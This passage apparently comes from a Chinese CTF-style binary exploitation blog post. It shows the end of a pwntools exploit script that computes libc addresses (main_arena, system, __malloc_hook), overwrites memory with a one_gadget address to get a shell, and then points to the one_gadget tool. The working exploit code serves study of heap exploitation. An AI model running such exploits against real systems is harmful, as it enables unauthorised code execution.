main_arena_addr=libc_base+localmain_arena
print "main_arena_addr:"+hex(main_arena_addr)
topchunk=main_arena_addr+0x30
print "topchunk:"+hex(topchunk)
system_addr=libc_base+system
print "system_addr:"+hex(system_addr)
__malloc_hook_addr=libc_base+__malloc_hook
print "__malloc_hook_addr:"+hex(__malloc_hook_addr)


'''
libc_start_main=base_addr("0x"+binascii.b2a_hex(leak(environ_addr)),'min',0xa0)
print "libc_start_main:"+hex(libc_start_main)
head_addr_input=base_addr('0x'+binascii.b2a_hex(leak(head_addr+1))+'00','min',0x20fe8)
print "head_addr_input:"+hex(head_addr_input)
'''

#getshell
getshell(topchunk-0xc,0x0804B004-0x8,'a'*8+p32(MAGIC_addr))

io.interactive()
io.close()
```

效果是：  
![](https://ae01.alicdn.com/kf/HTB1ZGjTaNz1gK0jSZSgq6yvwpXa1.jpg)  

Ps:寻找MAGIC可以用one_gadget这个工具，工具地址在： [https://github.com/david942j/one_gadget](https://github.com/david942j/one_gadget)

![](https://ae01.alicdn.com/kf/HTB1WUjUaND1gK0jSZFyq6AiOVXaF.jpg)

# 评论区
**请文明评论，禁止广告**
<img src="https://cloud.panjunwen.com/alu/扇耳光.png" alt="扇耳光.png" class="vemoticon-img">  

---